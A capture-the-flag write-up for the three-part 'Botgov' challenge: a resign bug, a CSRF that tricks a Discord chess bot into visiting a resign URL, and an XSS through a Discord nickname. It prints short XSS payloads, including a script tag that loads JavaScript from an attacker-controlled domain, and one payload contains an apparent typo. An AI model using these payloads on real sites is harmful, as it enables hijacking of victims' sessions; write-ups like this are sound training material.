# Botgov I, II, III

**Category**: misc, web

**Author**: koks

## Description

Botgov is waiting for you on Discord. Can you beat him?

## Solution

<details>
 <summary>Botgov I</summary>

The goal is to beat Botgov in a game of chess on Discord.

This can be solved in several ways:

- Due to a bug, you can send a `!chess resign` command while Botgov is thinking. The game will resign whoever has the current turn.
- Mirror the moves on another board (e.g. lichess.org) against a chess engine smarter than Botgov (Stockfish 8).
- Train your chess skills until you become a Grandmaster and come back to beat Botgov fair and square.

</details>

<details>
 <summary>Botgov II</summary>

Resigning now can only happen via the big red button in the `/botgov-ii/{game-uuid}` page. When clicked it sends a `GET /botgov-ii/{game-uuid}/resign` request and you resign the game. This request is credentialled with your cookie.

Let's see if there's a way to trick Botgov into visiting `/botgov-ii/{game-uuid}/resign` (CSRF).

In the `!chess help` menu there's a `!chess cybersec [input]` command where we can send cyber security blog posts for Botgov to visit, and read. We can send him a very nice read located at `/botgov-ii/{game-uuid}/resign`, he visits it and he resigns from our game. We get the flag in a Discord message.

</details>

<details>
 <summary>Botgov III</summary>

Again, resigning can only happen via the big red button in the `/botgov-ii/{game-uuid}` page. But this time when clicked it sends a `POST /botgov-ii/{game-uuid}/resign` request and you resign the game. This request is credentialled with your cookie.

The previous CSRF trick will not work because now we have a POST request.

In the HTML there's a comment on how the person who built this page has poor HTML skills. This is an indication for an injection in the HTML (i.e. XSS)

We control 2 inputs:

1. Our Discord avatar. We control the image that's displayed but the URL is coming from Discord itself. No luck here.
2. Our Discord nickname OR username.

If we change our nickname to something like "/>" we will see it disappear from the page.

We can use this XSS to call the resign() function, and send a link to the page to Botgov via `!chess cybersec` like Botgov II. The XSS will trigger in his browser, it will send the POST request along with HIS cookie, he will resign the game and we'll get the flag!

Limitations of Discord nicknames:

- Maximum 32 characters
- Some special characters are not allowed
- If you change the Username instead of the Nickname, there's a 2 hour cooldown before being able to change it again.

Sample nickname payloads:

- \<img srx=x onerror=resign()/>
- \<body onload="resign()">

Or if you control a very short domain, you can include arbitrary Javascript and execute whatever you want:

- \<script src=//{8 chars domain}>\</script>

</details>
